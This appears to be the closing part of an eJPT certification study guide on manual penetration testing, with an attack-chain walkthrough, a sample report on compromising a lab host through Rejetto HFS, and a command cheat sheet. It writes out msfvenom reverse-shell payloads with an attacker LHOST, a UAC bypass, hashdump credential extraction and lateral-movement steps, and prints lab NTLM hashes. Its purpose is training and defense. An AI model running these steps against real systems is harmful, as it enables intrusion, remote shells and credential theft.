```

**Alternative Methods:**
- Try built-in Windows tools
- Use PowerShell-based bypasses
- Exploit specific Windows services

---

## Integration with Other Penetration Testing Tools

### **Complete Attack Chain: Reconnaissance ‚Üí Exploitation ‚Üí Post-Exploitation**

This shows how manual exploitation fits into the full penetration testing process.

#### **Phase 1: Network Discovery and Reconnaissance**
```bash
# Network range discovery
nmap -sn 192.168.1.0/24
# Find all live hosts in network

# Port scanning discovered hosts
nmap -sS 192.168.1.1-254
# Quick SYN scan for open ports

# Service identification on interesting targets
nmap -sV -sC -A target_ip
# Detailed service enumeration

# Web application discovery
gobuster dir -u http://target_ip -w /usr/share/wordlists/dirb/common.txt
# Find hidden web directories

# SMB enumeration if applicable
enum4linux target_ip
smbclient -L target_ip
# Windows file sharing analysis
```

#### **Phase 2: Vulnerability Assessment**
```bash
# Search for service-specific exploits
searchsploit [service] [version]

# Web vulnerability scanning
nikto -h http://target_ip
# Basic web vulnerability check

# Manual testing
curl -I http://target_ip
# Check server headers manually

# Database of vulnerabilities
searchsploit --id CVE-2019-XXXX
# Research specific CVEs
```

#### **Phase 3: Exploitation (Our Manual Process)**
```bash
# Execute the complete manual exploitation process
# (As demonstrated in our detailed lab walkthrough)

# Initial compromise
msfconsole ‚Üí exploit ‚Üí meterpreter session

# Privilege escalation
getsystem or manual UAC bypass

# Persistence establishment
migrate to stable process
```

#### **Phase 4: Post-Exploitation Activities**
```bash
# System enumeration
systeminfo
whoami /all
net user
net localgroup administrators

# Network discovery from compromised host
ipconfig /all
arp -a
netstat -an

# Credential harvesting
hashdump
# Windows password hashes

# Lateral movement preparation
# Use discovered credentials on other systems
```

### **Tool Integration Workflows:**

#### **Nmap ‚Üí Metasploit Integration:**
```bash
# Use Nmap results to guide Metasploit module selection
nmap -sV -oX scan_results.xml target_ip

# Import Nmap results into Metasploit
msfconsole
db_nmap -sV target_ip
hosts
services
```

#### **Searchsploit ‚Üí Metasploit Integration:**
```bash
# Find exploit in searchsploit
searchsploit apache 2.4.29

# Copy exploit to Metasploit if available
searchsploit -m 47887.rb

# Or use corresponding Metasploit module
use exploit/linux/http/apache_mod_rewrite_ldap_injection
```

#### **Burp Suite ‚Üí Manual Exploitation:**
```bash
# Use Burp to analyze web applications
# Find injection points and parameter manipulation opportunities

# Export interesting requests
# Convert to manual exploitation attempts

# Use findings to guide searchsploit queries
searchsploit sql injection
searchsploit file upload
```

---

## Documentation and Professional Reporting

### **Evidence Collection During Exploitation:**

#### **Screenshots to Take:**
1. **Successful ping response** - Proves target was accessible
2. **Nmap scan results** - Shows open ports and services
3. **Searchsploit output** - Documents exploit research
4. **Metasploit exploit success** - Meterpreter session established
5. **getuid output** - Shows initial privilege level
6. **getsystem or UAC bypass** - Privilege escalation proof
7. **hashdump results** - Password hash extraction
8. **Flag or target file** - Mission objective completed

#### **Command History to Save:**
```bash
# Save all commands to file
history > exploitation_commands.txt

# Or use script command to log everything
script exploitation_session.log
# Run all your commands
exit
```

### **Professional Exploitation Report Template:**

```markdown
# Penetration Testing Report - Manual Exploitation

## Executive Summary
**Target:** demo.ine.local (10.0.22.143)
**Assessment Date:** [Date]
**Tester:** [Your Name]
**Severity:** CRITICAL

**Summary:** Complete system compromise achieved through exploitation of 
vulnerable HTTP File Server, resulting in SYSTEM-level access and 
extraction of all user password hashes.

## Technical Details

### 1. Discovery Phase
**Commands Executed:**
```bash
ping -c 4 demo.ine.local
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
```

**Findings:**
- Target system responsive (0% packet loss)
- HTTP File Server 2.3 identified on port 80
- Windows Server 2012 R2 detected

### 2. Vulnerability Research
**Commands Executed:**
```bash
searchsploit hfs
```

**Findings:**
- Rejetto HTTP File Server 2.3.x - Remote Command Execution
- Multiple exploit paths available
- CVE-2014-6287 identified

### 3. Initial Exploitation
**Commands Executed:**
```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
```

**Results:**
- Meterpreter session established successfully
- Initial access as VICTIM\admin user
- Remote code execution confirmed

### 4. Privilege Escalation
**Technique:** UAC Bypass using Akagi64 method 23
**Commands Executed:**
```bash
# Custom payload creation
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > backdoor.exe

# File transfer
upload Akagi64.exe C:\Users\admin\AppData\Local\Temp\
upload backdoor.exe C:\Users\admin\AppData\Local\Temp\

# UAC bypass execution
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

**Results:**
- UAC successfully bypassed
- NT AUTHORITY\SYSTEM privileges achieved
- Process migrated to lsass.exe for persistence

### 5. Post-Exploitation
**Commands Executed:**
```bash
getuid
sysinfo
hashdump
```

**Critical Findings:**
| Username | NTLM Hash |
|----------|-----------|
| admin | 4d6583ed4cef81c2f2ac3c88fc5f3da6 |
| Administrator | 659c812452a634e0e0a068e6bb1d822f |
| Guest | 31d6cfe0d16ae931b73c59d7e0c089c0 |

## Risk Assessment

### Severity: CRITICAL
**Impact:** Complete system compromise
**Likelihood:** High (publicly available exploits)
**CVSS Score:** 9.8/10

### Business Impact:
- Complete loss of system confidentiality
- Full administrative access to server
- All user credentials compromised
- Potential lateral movement to other systems

## Recommendations

### Immediate Actions (Within 24 hours):
1. **Patch or Replace HFS Server**
   - Update to latest version or remove service
   - Implement alternative file sharing solution

2. **Reset All User Passwords**
   - Force password reset for all accounts
   - Implement strong password policy

3. **Review System Logs**
   - Check for signs of previous compromise
   - Monitor for lateral movement attempts

### Short-term Actions (Within 1 week):
1. **Implement Application Whitelisting**
   - Prevent unauthorized executable execution
   - Block common UAC bypass techniques

2. **Enhanced UAC Configuration**
   - Set UAC to highest level
   - Disable convenience features

3. **Network Segmentation**
   - Isolate file servers from critical systems
   - Implement strict firewall rules

### Long-term Actions (Within 1 month):
1. **Endpoint Detection and Response (EDR)**
   - Deploy advanced threat detection
   - Monitor for post-exploitation techniques

2. **Regular Penetration Testing**
   - Quarterly security assessments
   - Focus on privilege escalation techniques

3. **Security Awareness Training**
   - Educate users about social engineering
   - Implement incident response procedures

## Evidence Files
- exploitation_commands.txt
- metasploit_session_logs.txt
- screenshot_01_ping_response.png
- screenshot_02_nmap_results.png
- screenshot_03_exploit_success.png
- screenshot_04_system_access.png
- screenshot_05_hash_dump.png

## Appendix: Command Reference
[Include complete list of commands used]
```

---

## Quick Reference Guide

### **Essential Command Cheat Sheet:**

#### **Discovery Phase:**
```bash
ping -c 4 target_ip                 # Test connectivity
nmap target_ip                      # Basic port scan
nmap -sV -p port target_ip         # Service version detection
```

#### **Research Phase:**
```bash
searchsploit service_name           # Find exploits
searchsploit -u                     # Update database
searchsploit -t keyword             # Title search only
```

#### **Exploitation Phase:**
```bash
msfconsole -q                       # Start Metasploit
use exploit/path/to/exploit         # Select exploit
set RHOSTS target_ip                # Set target
show options                        # Check settings
exploit                             # Execute attack
```

#### **Payload Generation:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > payload.exe
```

#### **Multi-Handler:**
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit
```

#### **File Transfer:**
```bash
upload local_file remote_path       # Upload to target
download remote_file local_path     # Download from target
```

#### **Privilege Escalation:**
```bash
getuid                              # Check current user
getsystem                           # Automatic escalation
# If getsystem fails, use UAC bypass tools
```

#### **Post-Exploitation:**
```bash
sysinfo                             # System information
ps                                  # Process list
migrate PID                         # Process migration
hashdump                            # Extract password hashes
```

### **Memory Tricks for eJPT:**

#### **Remember the Flow:**
**DISCOVER ‚Üí RESEARCH ‚Üí EXPLOIT ‚Üí ESCALATE ‚Üí EXTRACT**

#### **Port Numbers to Remember:**
- **80/443** - HTTP/HTTPS (web servers)
- **21** - FTP (file transfer)
- **22** - SSH (secure shell)
- **23** - Telnet (insecure remote access)
- **139/445** - SMB (Windows file sharing)
- **3389** - RDP (Remote Desktop)

#### **Common Exploit Paths:**
- **Web Servers** ‚Üí Often have public exploits
- **FTP Services** ‚Üí Check for anonymous access
- **SSH Services** ‚Üí Try password attacks
- **SMB Services** ‚Üí Look for null sessions
- **RDP Services** ‚Üí Brute force credentials

---

## Final Study Tips for eJPT Success

### **Practice Recommendations:**

#### **Daily Practice (30 minutes):**
1. **5 minutes** - Nmap scanning different targets
2. **10 minutes** - Searchsploit research for common services
3. **10 minutes** - Basic Metasploit module usage
4. **5 minutes** - Command syntax memorization

#### **Weekly Lab Sessions (2-3 hours):**
1. **Complete exploitation scenarios** from start to finish
2. **Time yourself** to build speed
3. **Practice documentation** and reporting
4. **Try different attack paths** for same targets

#### **Pre-Exam Checklist:**
- [ ] Can perform complete nmap scan in under 3 minutes
- [ ] Know searchsploit syntax by heart
- [ ] Can set up Metasploit exploits without looking up syntax
- [ ] Understand difference between shell and meterpreter
- [ ] Know basic Windows and Linux post-exploitation commands
- [ ] Can create custom payloads with msfvenom
- [ ] Understand UAC bypass concepts
- [ ] Know how to extract password hashes

### **Common Exam Pitfalls to Avoid:**

1. **Spending too long on discovery** - Set time limits
2. **Not reading error messages** - Always check output carefully
3. **Forgetting to verify exploits worked** - Always check getuid
4. **Not documenting findings** - Take screenshots continuously
5. **Panicking when first exploit fails** - Have backup plans

### **Confidence Builders:**

#### **Signs You're Ready:**
- Complete exploitation scenarios consistently under time pressure
- Troubleshoot common problems without external help  
- Explain each step of the process to someone else
- Adapt when preferred tools don't work
- Document findings professionally

This comprehensive guide provides everything needed to master manual exploitation techniques for both professional penetration testing and eJPT exam success. The combination of theoretical understanding, practical lab experience, and professional documentation skills will ensure success in time-pressured examination environments.
